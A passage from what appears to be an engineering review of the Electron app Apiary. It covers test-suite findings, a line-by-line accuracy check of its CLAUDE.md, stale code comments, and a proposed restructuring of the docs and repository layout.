  - tests/integration/appService.test.ts is 1205 lines, 65 tests and 10 top-level `describe`s (git operations :587, multi-tab shells :649, resume with a pty :693, auto-import :735, composer/prompt delivery :798, notes :898, settings payload :998, worktree conflict :1046, moveSession :1117), all sharing one `beforeEach` (:24-37).
  - Git repo builders are duplicated: `git()`/`makeGitWorkdir` (appService.test.ts:42-55), `makeRepoWithWorktree` (e2e/helpers.ts:92-111), `makeRepo` (unit/worktreeResolver.test.ts:21), and more in branchOps.test.ts (7 `user.email` sites), gitToolbar.spec.ts, gitMenu.spec.ts, sidebarFolders.spec.ts and allWorktrees.spec.ts.
  - The standard fixture is defined twice (e2e/helpers.ts:211-246 and component/fakeApiary.ts FIXTURE_SESSIONS/PROJECTS). The title "Fix CSV export bug" is hard-coded in 34 test files and id `1111…` in 9.
  - The component and e2e `helpers.ts` both export `sidebarSession` and `clickRowAction`. These are different APIs over different drivers, which is fine, but the names should say so or share docs.
  - Unused `src/renderer/state/useDebouncedValue.ts` (gap table).
- **What:**
  - Split appService.test.ts into `tests/integration/appService/<topic>.test.ts`, with a shared `tests/integration/appService/setup.ts` exporting `useService()`.
  - Add `tests/fixtures/gitRepo.ts` (`initRepo`, `commit`, `addWorktree`, isolated env from TEST-9).
  - Add `tests/fixtures/standard.ts` exporting `STANDARD_SESSIONS = { csv: { id, title, slug }, … }`, consumed by makeSession callers, the e2e harness and the fake.
  - Delete `useDebouncedValue.ts`.
- **Why:** Smaller files are easier to navigate and to target with `-t`. A title change becomes a one-line edit. The fake and e2e cannot diverge on fixture data.
- **Gain:** Maintainability.
- **Implementation steps:** Pure moves first (no assertion changes), then the fixture modules, then replace the literals file by file.
- **Verification:** The test count is unchanged (`vitest list | wc -l` before and after). All green.
- **Constraints:** Tests are named as statements about behaviour; keep names unchanged when moving (the proposal doc keeps names findable).
- **Depends on:** TEST-9 (git env), TEST-5 (standard fixture builder).

---

### Verified OK / keep as is

- **E2E isolation per test.** Each launch gets its own `mkdtemp` home, `--user-data-dir`, `APIARY_DB_PATH` and `APIARY_CONFIG_ROOT` (helpers.ts:193, 288-292). `closeApp` waits for the process to exit and kills it after 5 s, reporting the test by name (helpers.ts:81-90). `ELECTRON_RUN_AS_NODE` is stripped (helpers.ts:53-61).
- **Fixed waits.** Only 5 `waitForTimeout`s in non-opt-in specs, each measuring a rate over a window: newSession.spec.ts:88,95, terminal.spec.ts:153,156, search.spec.ts:140. The helpers.ts:423 poll loop is justified. `expectStays` exists for proving that something does not happen. There are 50 `expect.poll`/`toPass` uses and no raw `setTimeout` sleeps in specs.
- **Parallelism design.** 4 workers locally and 2 on CI, `fullyParallel` on the `parallel` project, and a `serial` project with `workers: 1` for clipboard, focus and timing tests (playwright.config.ts:18-28). The `@smoke` subset exists (12 tests).
- **Opt-in specs.** Live and bench specs are skipped unless `APIARY_LIVE_CLAUDE=1`/`APIARY_BENCH=1`, with lint-justified `test.skip`.
- **Component harness.** It mounts exactly what main.tsx mounts and uses the real stylesheet and fonts. It waits for `document.fonts.ready` (renderApp.tsx). It clears localStorage per test (setup.ts). It uses a real mouse through a server command (commands.ts). `DEBUG_PRINT_LIMIT=0` and a 5 s poll are set. **187/187 pass in 19.8 s.**
- **The fake is typed as `ApiaryApi`** and records calls, with an `override()` per test. It is sound as a base; it only lacks a check against real behaviour (TEST-5).
- **Injected dependencies already done well:** `UpdateService` (backend and timers), `resolveMrStatus` (exec, now), `detectVsCode`/`openInVsCode` (exec, exists, spawn), `ClaudeSessionTracker`, `claudeRename` (sleep), `gitlabMr` (exec).
- **Activity fixtures are recordings**, captured by a script and never run in CI (CLAUDE.md). Keep it that way.
- **ESLint.** Type-aware across all three tsconfigs, per-area import restrictions encode the architecture, `no-floating-promises` and `no-misused-promises` are on, focused tests are errors in both Vitest and Playwright files, `--max-warnings 0` is set, and unused disable directives are errors. `npm run lint` passes (12.7 s).
- **No import cycles** in src (madge, 155 files).
- **`npm run typecheck` passes** (3.7 s). The tsconfig split (renderer and shared with DOM; main with Node) matches the "shared helpers in src/shared" rule.
- **Hooks.** lint-staged on commit, commitlint plus the AI-attribution grep on commit-msg, typecheck and lint on push. There are no tests in hooks, which is correct while they rebuild natives (revisit after TEST-2).
- **electron-builder `files`** is an allowlist (`out/**`, `package.json`, `build/icon.png`), so tests/ and docs/ are not packaged. `publish` is set with `--publish never` on every invocation. The `zip` target and `latest-*.yml` are uploaded. `scripts/dist.mjs`'s temp-config approach to the array-merge problem is sound.
- **electron-vite.** The search worker is a separate entry with a stable name. `@xterm/headless`/`addon-serialize` are bundled on purpose (CJS interop). The preload is forced to CJS for `sandbox: true`.
- **CI** already runs unit, integration and component tests on every PR (ci.yml `test` job), with `permissions: contents: read`.

### Suggested order of work

1. **TEST-8, TEST-9, TEST-10** (S each): make e2e hermetic and debuggable. They are prerequisites for CI e2e and cheap.
2. **TEST-1 plus TEST-2** (M, S): end the ABI trap, and split unit from integration. Unit tests can then go in pre-push.
3. **TEST-4** (M): bring ipc.ts under test (settings merge, channel parity).
4. **TEST-5** (M): contract tests, fake against the real main process. Fix the drift found in the table.
5. **TEST-11** (M): `@smoke` e2e on Linux CI under xvfb.
6. **TEST-13 and TEST-12** (M, S): safe release pipeline (verify, build, publish; macOS in CI), plus CI hygiene and Dependabot.
7. **TEST-3** (S): coverage reports, thresholds later.
8. **TEST-14** (S): console-error guard in component tests, then fix the TerminalView race.
9. **TEST-7 and TEST-18** (M, S): packaged-app smoke and a slimmer package.
10. **TEST-17** (L, ongoing): Electron 44 first, then Vitest and Vite, electron-vite, xterm, React 19.
11. **TEST-6, TEST-15, TEST-16, TEST-19**: seams, strict flags, lint rules and file reorganisation, done alongside other work.

## Part E: Documentation (CLAUDE.md), shared layer and repository structure

Reviewer scope: CLAUDE.md, README, docs/, `src/shared/**`, and the repo and directory layout.
Repo state reviewed: `8fc5fdf` (1.25.0), 396 tracked files. All evidence comes from reading the files
and from grep. The only command I ran beyond grep was `tsc --listFilesOnly`, which reads and changes nothing.

---

### 0. Headline

- **CLAUDE.md is accurate.** 0 of about 90 named symbols, paths and env vars are missing. It is also
  well written. Its problem is **size and organisation**. At 609 lines and 44,038 bytes (about 11k
  tokens) it is loaded into every session. It is organised as a series of war stories, not by task.
  It lacks the operational basics an agent needs first: how to run one test, what "done" means, the
  version and changelog rule, and recipes such as "add an IPC call".
- It has a handful of **stale or contradictory sentences**. The most important one says moved tabs
  are filled from the replay buffer. That is the exact mechanism the Windows section says was
  removed.
- **`src/shared` is pure and tidy in practice**, but nothing enforces its purity against Node, and
  several **types are defined 2 or 3 times** across shared, main and renderer (update status, plugin
  bar items, settings, `MrState`, pty-id formats).
- **Structure.** The top level is sensible. The issues are `scripts/fixtures` holding test-only fake
  binaries, a flat `src/main` and a flat `renderer/components`, docs with no index, and no LICENSE
  or CONTRIBUTING file.

---

### 1. CLAUDE.md accuracy table

Method: every backticked path, symbol, env var, npm script and number in CLAUDE.md was grepped in
`src/ tests/ scripts/` and the configs. Status is OK, STALE, WRONG or INCOMPLETE.

| # | CLAUDE.md claim (line) | Status | Evidence |
| --- | --- | --- | --- |
| 1 | "Two rules the codebase holds to" (19) | **WRONG count** | Three bullets follow (21, 24, 26) |
| 2 | "A new IPC call means touching `shared/api.ts`, `preload/index.ts` and `main/ipc.ts` together" (13-14) | **INCOMPLETE** | `tests/component/fakeApiary.ts` is typed as `ApiaryApi` and must also change. CLAUDE.md only says this 412 lines later (426) |
| 3 | Layouts: moving a tab "remounts its views onto the same processes (**the replay buffer fills them in**)" (336-337) | **STALE / contradicts 86-94** | `TerminalView.tsx:102-118`: "It used to be caught up by replaying the pty's raw output … So the main process hands over a rendered snapshot instead" |
| 4 | "CI (`ci.yml`) runs typecheck and lint on every push…" (461-462) | **INCOMPLETE** | The `ci.yml` `test` job also runs `npm test` and `npm run test:component`. `release.yml:58-66` repeats typecheck, lint and `npm test` per platform |
| 5 | e2e "Runs on **4 workers** (2 on CI)" (434) | OK (config), **misleading** | `playwright.config.ts:22` `workers: process.env.CI ? 2 : 4`, but e2e never runs on CI (`ci.yml:5-6` "The end-to-end suite is not here") |
| 6 | "`CHANGELOG.md` … the version in `package.json` is bumped per **release**" (605) | **INCOMPLETE** | Every commit carries its own version (`git log`: `feat(sidebar): 1.25.0 — …`, `fix(ci): 1.24.3 — …`). The maintainer rule is a bump plus a changelog section for every change. That rule is not in the repo |
| 7 | Terminals (62-65): the trim uses `PROMPT_DIRTRIM`, "zsh … deliberately left alone"; later (300-304) zsh gets a `ZDOTDIR` shim | OK but **split and confusing** | Both are true. The first applies to the trim, the second to minimal prompt. `main/pty/promptPath.ts:21-24` still calls a ZDOTDIR shim "not worth it", while lines 55-57 of the same file implement one |
| 8 | `~180 tests in ~20 s` (component) (425) | OK | 187 `it(` in `tests/component/*.test.tsx`; `docs/test-suite-proposal.md:13` says 184 / ~20 s |
| 9 | `@smoke` "one-minute run" (437) | OK | 11 spec files tagged; the proposal measured ~23 s |
| 10 | `--project=serial --no-deps` (436) | OK | `playwright.config.ts:26` |
| 11 | ABI table: `npm start/test/test:e2e/screenshot/test:component` (36-42) | OK | `package.json` scripts |
| 12 | `npm run typecheck` covers both tsconfigs (414) | OK | `package.json` `typecheck` |
| 13 | `npm run lint` runs four linters (447) | OK | `lint:js/css/md/sh` |
| 14 | hooks: pre-commit lint-staged, commit-msg commitlint + AI-attribution check, pre-push typecheck+lint (458-459) | OK | `.husky/*` |
| 15 | `tests/e2e/helpers.ts` strips `ELECTRON_RUN_AS_NODE` (57) | OK | `helpers.ts:47-56` |
| 16 | `resolveShellCwd`, `buildResumeCommand` UUID check, `readImage` confinement (22-23) | OK | 18/14/10 files; `appService.ts:1058` |
| 17 | `$SHELL -l -c 'exec claude --resume <uuid>'` (66) | OK | `pty/resumeCommand.ts:9,19` |
| 18 | `sendPrompt` waits for `CSI ?1049h` (72) | OK | `ptyManager.ts:49` `ALT_SCREEN` |
| 19 | stand-in slow TUI in `appService.test.ts` (73-74) | OK | `appService.test.ts:857` |
| 20 | bracketed paste (75) | OK | `appService.ts:83-87` |
| 21 | `attachCustomKeyEventHandler` (77) | OK | `TerminalView.tsx:186` |
| 22 | `PtyManager.snapshot()`, `ScreenBuffers`, `replay()`, `screen()` (88, 159-164) | OK | `ptyManager.ts:186-206`, `pty/screen.ts` |
| 23 | 256KB replay buffer (162) | OK | `ptyManager.ts:64` `REPLAY_BYTES = 256 * 1024` |
| 24 | `?detach=`, `?transfer=`, `TabTransfer`, `tab-adopt`, `ptyOverrides` (101-109) | OK | `uiState.ts:118`, `api.ts:258-259`, `types.ts:163` |
| 25 | `windowAtPoint.ts` decides drops (115) | OK | `src/main/windowAtPoint.ts` |
| 26 | `sessionLayoutStore.ts` JSON, 500 ms debounce, `hasLayout` (121-127) | OK | `sessionLayoutStore.ts:15,79`; `App.tsx:1109,1120` |
| 27 | `pruneStaleLive`, `AppService.resume()` checks `PtyManager.has()` (130-136) | OK | `sessionLayoutRestore.ts:9`; `appService.ts:626-627` |
| 28 | `TabRegistry.report/list/focusTab`; `activeTabs` computes status fresh (140-147) | OK | `ipc.ts:152-159` |
| 29 | classifier order, bottom 15 non-blank lines, 2 s window (166-172) | OK | `activity.ts:4,14,17,79-86` |
| 30 | `scripts/capture-activity-fixtures.mjs` → `tests/fixtures/activity/`; `activityFixtures.test.ts` (176-179) | OK | files exist; 7 recorded scenarios |
| 31 | `ActivityLegend.tsx` draws real `.status-dot`s (185-187) | OK | `ActivityLegend.tsx:15,66` |
| 32 | `ClaudeSessionTracker`, `renameTerminalInClaude`, `keyFor`, `shellTabs` (193-208) | OK | 8/13/12/26 files |
| 33 | `pty/childEnv.ts` strips `CLAUDE_CODE_CHILD_SESSION` etc. (220) | OK | 11 files |
| 34 | `APIARY_LIVE_CLAUDE=1 npm run test:e2e -- live/`; `sessionFollowing.spec.ts` (224-225) | OK | `tests/e2e/live/haikuSessions.spec.ts`, `tests/e2e/sessionFollowing.spec.ts` |
| 35 | `validateTheme`, `ensureReadable`, `limitAlpha`, `MIN_ALPHA.glass`, `backdrops` (233-255) | OK | `theme/validate.ts:88,94,173,219,305` (the last four are module-private, which is fine) |
| 36 | `applyTheme`, `themeToCssVars`, allowlist in `spec.ts` (240-243) | OK | `theme/cssVars.ts`, `theme/spec.ts` |
| 37 | effects: 30 fps cap; 15 fps without GPU (246, 267) | OK | `ThemeEffects.tsx:7,15` |
| 38 | no `backdrop-filter` anywhere; `--glass-rim`; `--bg-popover` (256-261) | OK | `backdrop-filter` appears only in comments (3 files); `cssVars.ts:58-62` |
| 39 | `APIARY_BENCH`, `APIARY_BENCH_GPU`, `themeGpuCompositing()`, logged as `theme gpu` (262-268) | OK | `themeIpc.ts:36-43` logs `log.info('theme', 'gpu', …)` |
| 40 | radius tokens are calc()s of `--radius-panel`, 4/5/10 px at 8 (270-272) | OK | `styles.css:111-124` (×0.5, ×0.625, ×1.25) |
| 41 | Stylelint forbids literal radius > 3px (455) | OK | `.stylelintrc.json` `declaration-property-value-disallowed-list` |
| 42 | `DEFAULT_THEME_ID` Liquid Glass; `APIARY_DEFAULT_THEME=original` in `launchEnv`; `realDefaultTheme` (273-275) | OK | `themeStore.ts:25` `'builtin:glass'`; `helpers.ts:53-60,290` |
| 43 | `initialTheme`, `themeState()`, `useAppliedTheme` (276-289) | OK | `api.ts:331-332`; `useTheme.ts:33` |
| 44 | generator flags `--tools "" --safe-mode --strict-mcp-config --no-session-persistence` (278-282) | OK | `themeGenerator.ts:64` |
| 45 | Reset Theme `Cmd/Ctrl+Alt+Shift+T`; `--safe-theme` / `APIARY_SAFE_THEME=1` (290) | OK | `menu.ts:86-87`; `index.ts:452-453` |
| 46 | `terminalMinimalPrompt` default on; `<userData>/prompt-shim/zsh`; `APIARY_USER_ZDOTDIR` (300-303) | OK | `settings.ts:118`; `index.ts:430`; `promptPath.ts:70` |
| 47 | `cwd_override`, `recordSessionMove`, `toSession`, `syncSessions` omits the column (308-318) | OK | `sessionStore.ts:44,55,117,132-138,288-290` |
| 48 | 8 presets, max 4 panes; `tidyLayout`, `setLayout`, `placeInZone`, `openBeside`, `LayoutContext` (322-339) | OK | `layout.ts:6,33` |
| 49 | Shell ids `shell:<session key>:<n>` (335) | OK | `SessionColumn.tsx:252`; `appService.ts:687` |
| 50 | FTS `tokenchars`, `toMatchQuery`, `MIN_PREFIX_CHARS` = 3 (343-373) | OK | `searchIndex.ts:17,66,73` |
| 51 | `searchWorker.ts` / `searchClient.ts`; `SearchClient.search` returns `null` (359-367) | OK | files exist; worker is a 2nd entry in `electron.vite.config.ts:20-23` |
| 52 | `useSessionTreeCache`, `filterTreeLocal`, `searchContent` → `AppService.searchSessions` (380-388) | OK | 3/29/7/17 files |
| 53 | `fakeApiary.ts` models the e2e fixture's four sessions (423-424) | OK | `fakeApiary.ts:7` |
| 54 | `DEBUG_PRINT_LIMIT=0` and 5 s poll (429-430) | OK | `vitest.component.config.ts:22-23` |
| 55 | `Harness.close()`, `expectStays`, `test.info().outputPath()` (438-443) | OK | `helpers.ts:30,596`; `live/themeGenerator.spec.ts:33` |
| 56 | ESLint per-area architecture blocks; React compiler rules off (449-453) | OK | `eslint.config.js:72-119, 87-95` |
| 57 | `pluginSettings[pluginId]`; `glab` (486-498) | OK | 15 files |
| 58 | `saveSettings`, `DEFAULT_SETTINGS`, `SETTINGS_VERSION`, `migrateSettings` (502-511) | OK | `settings.ts:19` `SETTINGS_VERSION = 1` |
| 59 | `ipc.ts` settings merge treats missing as unchanged (515-521) | OK | `ipc.ts:236-280` (`keep()`) |
| 60 | `shared/redact.ts`; log scopes `session-tracker`, `tabs`, `rename`, `mr-status`, `navigation` (536-550) | OK | `log.info('session-tracker'…)` ×2, `'tabs'` ×2, `'rename'` ×3, `'mr-status'` ×2, `'navigation'` ×3 |
| 61 | `update/capability.ts`, `hasDeveloperIdSignature()`, `pickInstaller`, `UpdateBackend`, `APIARY_FAKE_UPDATE` (572-601) | OK | 4/16/15/4 files |
| 62 | `release.yml` uploads `latest-*.yml`; mac `zip` target (590-595) | OK (not re-verified in depth) | `release.yml:73` "Upload release assets" |
| 63 | "Never add AI attribution to a commit message" (609) | OK | `.husky/commit-msg:4-8` |

**Env vars the app reads that CLAUDE.md never names.** From `grep process.env` in `src/`:
`APIARY_CONFIG_ROOT`, `APIARY_DB_PATH`, `APIARY_GLAB_PATH`, `APIARY_CODE_PATH`, `APIARY_FAKE_LIVE`,
`APIARY_HEADLESS`, `APIARY_FAKE_UPDATE_MODE`, `CLAUDE_CONFIG_DIR` (`config.ts:12`). The test harness
also reads `APIARY_HEADED` (`helpers.ts:41`) and `APIARY_BENCH_RUNS`, `APIARY_BENCH_THEMES` and `APIARY_BENCH_OUT`
(`bench/themePerf.spec.ts`). The README mentions `APIARY_HEADED` (line 135); CLAUDE.md does not.

**Stale code comments found while verifying.** These are in my area because they are the in-code docs.

- `src/main/ipc.ts:646-649` says each broadcast "makes every open window call `activeTabs`, which
  **replays up to 256KB per tab (`REPLAY_BYTES`) and runs a global ANSI regex plus a split** over all
  of it". `activeTabs` now reads `service.pty.screen()` (`ipc.ts:157-159`). CLAUDE.md:159-162
  describes that fix.
- `src/shared/api.ts:110-111`: an orphaned JSDoc ("A tab open somewhere … Mirrors `OpenTab`") sits
  directly above `SavedTheme`'s own JSDoc. It belongs to `ActiveTabPayload` at line 150.
- `src/shared/api.ts:370-381`: the 12-line JSDoc for `tabDropped` sits above `logStatus` (383). The
  real `tabDropped` (391) has no doc, so the IDE shows the wrong text on hover.
- Comments that refer to a plan's task numbers, which a reader cannot resolve: `App.tsx:1105` "(see Task 3)",
  `useTree.ts:24` "Task 9's ranking", `useTree.ts:82` "this task", and `shared/layoutReport.ts:25` "a later task".

---

### 2. Section mapping: every current CLAUDE.md section and its new home

Target layout, explained in DOC-1:

- A **root `CLAUDE.md`** of about 130 lines. It is always loaded.
- **Nested `CLAUDE.md` files** next to the code they describe. Claude Code loads these when it reads
  files in that directory, so they cost nothing until relevant.
- **`docs/architecture/*.md`** for topics that span main, shared and renderer. Each one is linked
  from the root and from each nested file that touches it.
- A **one-line hard rule in root** for every topic whose failure is silent. That way an agent that
  never opens the deep doc still cannot break the invariant.

| Current section (lines) | Size | New home | What stays in root |
| --- | --- | --- | --- |
| Intro (1-5) | 5 | root "What Apiary is" | all |
| The shape of it (7-18) | 12 | root "Architecture map" (expanded into a feature → path table) | all, expanded |
| Three security rules (19-29) | 11 | root "Hard rules"; full prose in `docs/architecture/boundaries.md` (can be ADR-0001/0002/0003) | 3 one-liners |
| Native-module ABI trap (31-50) | 21 | root "Commands" (table kept, it is load-bearing) + `docs/testing.md` for the story | the table + "never run npm test and test:e2e at once" |
| `ELECTRON_RUN_AS_NODE` (52-58) | 8 | `docs/debugging.md` + one line in `tests/CLAUDE.md` troubleshooting | none |
| Terminals and PTYs (60-79) | 21 | `src/main/pty/CLAUDE.md` (pty, env, prompt delivery, bracketed paste) + `src/renderer/CLAUDE.md` (xterm key handler) | "Prompt delivery waits for alt-screen; see pty/CLAUDE.md" |
| Windows, and what belongs to which (81-117) | 38 | `docs/architecture/windows-and-tabs.md` | 3 one-liners: pty belongs to main; never spawn over a live id; cross-window drops are decided by geometry in main |
| Window and tab state across a relaunch (119-136) | 19 | `docs/architecture/windows-and-tabs.md` §Persistence | none |
| Tab registry + activity classification (138-187) | 51 | registry part → `windows-and-tabs.md`; classifier → `docs/architecture/activity.md`; fixture-recording rule → `tests/CLAUDE.md` | "Activity reads the rendered screen; never add a 'looks like a question' heuristic; fixtures are recordings" |
| Which session a terminal is on (189-228) | 41 | `docs/architecture/session-following.md` (merge with activity.md if preferred) | "Ask Claude's `sessions/<pid>.json`, don't guess; verify with `tests/e2e/live`" |
| Themes (230-292) | 64 | `src/shared/theme/CLAUDE.md` (validator, spec, effects, generator); renderer bits (floating = solid, radius tokens, no `backdrop-filter`) → `src/renderer/CLAUDE.md`; perf bench → `tests/CLAUDE.md` | "A theme is data; `validateTheme` is the only way in; no `backdrop-filter`" |
| Terminals: painting and prompts (294-304) | 12 | painting → `src/renderer/CLAUDE.md`; minimal prompt → `src/main/pty/CLAUDE.md` (**merged** with 60-79) | none |
| cwd override column (306-318) | 14 | `src/main/store/CLAUDE.md` | "A rescan never writes `cwd_override` or `project_path`" |
| Layouts (320-339) | 21 | `src/renderer/state/CLAUDE.md` (fix the stale "replay buffer" sentence) | "Every layout change goes through `tidyLayout`" |
| Search (341-388) | 49 | `src/main/search/CLAUDE.md`; the renderer-filtering paragraph (380-388) → `src/renderer/state/CLAUDE.md` | "FTS runs in a worker; `null` ≠ `[]`; don't add `-`/`!` to tokenchars" |
| Conventions (390-414) | 26 | root "Conventions" (condensed to 6 bullets); the controls/buttons story (400-407) → `src/renderer/CLAUDE.md` | condensed |
| Testing (416-443) | 29 | `tests/CLAUDE.md` (full) | "Which layer" 3-line summary + DoD |
| Linting and hooks (445-465) | 22 | root "Commands"/"Hooks" (5 lines) + `CONTRIBUTING.md` detail | condensed |
| Session-bar plugins (467-498) | 33 | `src/main/plugins/CLAUDE.md` | none (recipe in root "How to add") |
| Changing a default reaches nobody (500-511) | 13 | `src/main/CLAUDE.md` §Settings (**merged** with 513-521) | "Changing a default needs a migration (`SETTINGS_VERSION`)" |
| Settings arriving over IPC (513-521) | 10 | `src/main/CLAUDE.md` §Settings | "Missing field over IPC = unchanged, never false" |
| The diagnostic log (523-550) | 29 | `src/main/log/CLAUDE.md` | "Never pass conversation content to the logger" |
| Measure before fixing (552-568) | 18 | `docs/debugging.md` (with the sqlite `-shm` trap and `ELECTRON_RUN_AS_NODE`) | 2-line principle |
| Updating (570-601) | 33 | `src/main/update/CLAUDE.md` | "Releases must ship `latest-*.yml`; keep the mac `zip` target" |
| Releasing (603-609) | 7 | root "Versioning, changelog, commits" + `CONTRIBUTING.md` | all (expanded) |

Estimated result: root about 130 lines (about 2.5k tokens, down from about 11k). About 480 lines move to
13 files. **No prose is deleted.** Every sentence gets exactly one home.

---

### 3. Draft root CLAUDE.md outline (headings, one line each)

```markdown
# Working on Apiary
One paragraph: Electron 38 + React 18 + TS desktop app that browses/searches/resumes Claude Code
sessions; this file is the map, the rules and the commands — the "why" lives next to the code.

## Commands
Table: install · start · build · typecheck · lint / lint:fix · test (unit+integration) ·
test:component · test:e2e · test:e2e:smoke · screenshot — each with the ABI it rebuilds for.
Single test: `npm test -- tests/unit/x.test.ts` · `npm run test:component -- tests/component/x.test.tsx`
· `npm run test:e2e -- tests/e2e/x.spec.ts -g "title"` · serial only: `… -- --project=serial --no-deps`.
Opt-in: `APIARY_LIVE_CLAUDE=1 … live/` (spends tokens) · `APIARY_BENCH=1 … bench/` · `APIARY_HEADED=1`.

## Never
Never run `npm test` and `npm run test:e2e` at the same time (native-module rebuild).
Never run `npx vitest`/`npx playwright test` directly unless the ABI is already right.
Never push, tag or release without asking. Never add AI attribution to commits.

## Definition of done
typecheck + lint clean · tests in the cheapest layer that proves it, run for touched areas
(`npm test`; `test:component` for renderer changes; the matching e2e spec for main/wiring) ·
version bumped + CHANGELOG section · Conventional Commit `type(scope): X.Y.Z — summary`.

## Versioning, changelog, commits
Every change is a new version (patch/minor per SemVer) with its own Keep-a-Changelog section; never
reuse the current version. Commit subject carries the version. `v*` tag → release.yml.

## Architecture map
src/main (machine: SQLite, ptys, watcher, git, search) · src/preload (the bridge) · src/renderer
(React, no Node) · src/shared (pure, both sides) · tests/{unit,integration,component,e2e}.
Feature → where it lives table (sessions/scanner, tree/sidebar, transcript, terminals, layouts,
windows/tabs, activity, search, themes, plugins, updater, diagnostics log, settings).

## Hard rules (each links to where the reason lives)
- The renderer never supplies a filesystem path → docs/architecture/boundaries.md
- cwd comes from the JSONL, never the projects dir name
- Git's prose is not an interface (use --porcelain)
- A pty belongs to main; never spawn over a live id; late views get a snapshot, not replay
- Activity reads the rendered screen; no "looks like a question" heuristic; fixtures are recordings
- A rescan never writes cwd_override/project_path
- Every layout change goes through tidyLayout
- A theme is data; validateTheme is the only way in; no backdrop-filter; no literal radius > 3px
- Settings: missing IPC field = unchanged; changing a default needs a migration
- The diagnostic log never receives conversation content
- Releases must ship latest-*.yml and keep the mac zip target

## How to add…
One short recipe each (files to touch, test to write): an IPC call · a setting (+ migration) ·
a session-bar plugin · a theme token / effect · a log line · a component test · an e2e spec.

## Conventions
Comments say why · styles.css uses tokens for colour and shape · controls go through .btn ·
tests are statements about behaviour · pure cross-process helpers live in src/shared · strict TS.

## Environment variables and on-disk state
Table of APIARY_* / CLAUDE_CONFIG_DIR / --safe-theme, and userData files
(apiary.db, search.db, settings.json, themes.json, session-layout.json, prompt-shim/, logs).

## Measure before fixing
Two lines + link to docs/debugging.md.

## Where the long-form lives
Nested CLAUDE.md files (list), docs/architecture/*, docs/adr/*, docs/history/ (plans/specs —
historical, code wins on conflict).
```

---

### 4. Proposed repo tree (directory level)

```text
apiary/
├── CLAUDE.md                    ~130 lines: commands, rules, DoD, map, recipes
├── CONTRIBUTING.md              NEW – humans: setup, ABI trap, commands, commits/versions, release
├── README.md                    users: features, install, requirements; 5-line "Development" → CONTRIBUTING
├── CHANGELOG.md
├── LICENSE                      NEW – package.json already says MIT
├── .nvmrc                       NEW – "22" (engines >=22, CI pins 22)
├── package.json · package-lock.json
├── electron.vite.config.ts · electron-builder.yml
├── tsconfig.json · tsconfig.node.json · tsconfig.eslint.json
├── eslint.config.js · .stylelintrc.json · .markdownlint-cli2.jsonc · commitlint.config.js
├── vitest.config.ts · vitest.component.config.ts
├── playwright.config.ts · playwright.screenshot.config.ts     (stay at root: tools find them there)
├── .github/workflows/{ci,release}.yml
├── .husky/
├── build/                       electron-builder resources only (unchanged)
├── scripts/
│   ├── dist.mjs · generate-icon.mjs · fix-node-pty-permissions.mjs     build/install
│   ├── capture-activity-fixtures.mjs                                    dev tool (writes tests/fixtures)
│   └── screenshot/  screenshot.spec.ts · fake-claude.sh                 README image only
├── docs/
│   ├── install-prompt.md · screenshot.png       (paths kept: README and external links point here)
│   ├── architecture/  boundaries.md · windows-and-tabs.md · activity.md · session-following.md
│   ├── testing.md · debugging.md · packaging.md (README's 90-line Packaging section moves here)
│   ├── adr/  0001-renderer-never-supplies-paths.md … (see DOC-10)
│   └── history/  README.md (index) · specs/ · plans/ · test-suite-proposal.md   (was docs/superpowers)
├── src/
│   ├── main/        CLAUDE.md + feature folders; nested CLAUDE.md in pty/ search/ store/ update/ plugins/ log/
│   │   ├── app/        index.ts · ipc.ts · appService.ts · menu.ts · config.ts · settings.ts
│   │   ├── windows/    windowAtPoint · windowBounds · sessionLayoutStore · sessionLayoutRestore ·
│   │   │               layoutFlushCoordinator · tabRegistry · navigationGuard
│   │   ├── claude/     claudeRename · claudeSessionTracker · live/liveSessionDetector
│   │   └── git/ log/ plugins/ pty/ scanner/ search/ store/ theme/ transcript/ tree/ update/ vscode/  (unchanged)
│   ├── preload/
│   ├── renderer/    CLAUDE.md; components/ grouped by feature (details: renderer reviewer)
│   │   ├── components/{sidebar,session,terminal,layout,transcript,git,settings,dialogs,common}/
│   │   ├── hooks/  (useHoverCard, useMrStatuses, usePluginBar, use* from state/)
│   │   ├── state/  CLAUDE.md (layouts, local filtering) – pure state modules
│   │   └── theme/
│   └── shared/
│       ├── ipc/        channels.ts · api.ts (ApiaryApi) · index.ts
│       ├── domain/     session.ts · git.ts · tabs.ts (TabTransfer, Persisted*, TabView, ptyIds) ·
│       │               settings.ts · update.ts · plugins.ts
│       ├── search/     fuzzy.ts · treeFilter.ts · sessionRank.ts
│       ├── activity.ts · redact.ts · mrRefs.ts · gitMessages.ts · forkLabel.ts · promptPreview.ts
│       ├── types.ts · api.ts          temporary re-export barrels during migration, then deleted
│       └── theme/      CLAUDE.md; spec · validate · readability · color · cssVars · prompt · builtins · state · effects/
└── tests/
    ├── CLAUDE.md       which layer, how to run one, fixtures are recordings, bench, live
    ├── unit/ integration/ component/ e2e/{live,bench}/
    └── fixtures/  activity/ · titles/ · makeSession.ts · bin/{fake-glab.sh, fake-glab-api.sh, fake-code.sh}
```

**How to migrate without breaking the guard rails.** Evidence is from `eslint.config.js` and the tsconfigs.

- The ESLint area blocks match on `src/main/**`, `src/renderer/**` and `src/shared/**` (`eslint.config.js:73,82,112`).
  The tsconfig includes are whole directories (`tsconfig.json` `include: src/renderer, src/shared, …`;
  `tsconfig.node.json` `include: src/main, src/shared, tests`). **Any move inside those roots is invisible
  to both.**
- **Trap.** The restricted-import patterns are `**/main/**` and `**/renderer/**`
  (`eslint.config.js:76,104,116`). Never create a subfolder named `main` or `renderer`, for example
  `src/renderer/components/main/` or `src/shared/renderer/`. Imports through it would be falsely
  flagged. A folder named `main` inside `renderer` would also match the main pattern.
- If `scripts/screenshot.spec.ts` moves, update four places: `playwright.screenshot.config.ts`
  (`testDir`/`testMatch`), `tsconfig.eslint.json:5`, `eslint.config.js:137` (change `scripts/*.spec.ts`
  to `scripts/**/*.spec.ts`) and README line 144. `lint:sh` uses `git ls-files '*.sh'`, so moved
  `.sh` files keep being linted.
- Vitest globs (`tests/unit/**/*.test.ts`, `tests/component/**/*.test.tsx`) and the Playwright
  `testDir` are already recursive.
- Do each area as its own commit. Order: `git mv`, then fix imports (the VS Code "Move file" refactor
  or a `ts-morph` script), then `npm run typecheck && npm run lint`, then `npm test` and
  `npm run test:component`. Each commit carries its own version bump and changelog line, per the
  maintainer's rule.

---

### 5. Findings

#### DOC-1: Restructure CLAUDE.md into a short root file plus nested, co-located docs

**Lead review:** Scheduled early (Phase 1), because every later phase is implemented by agents that read these files.

- **Severity:** high
- **Effort:** M
- **Evidence:** `wc` gives 609 lines and 44,038 bytes (about 11k tokens), loaded in every session. The
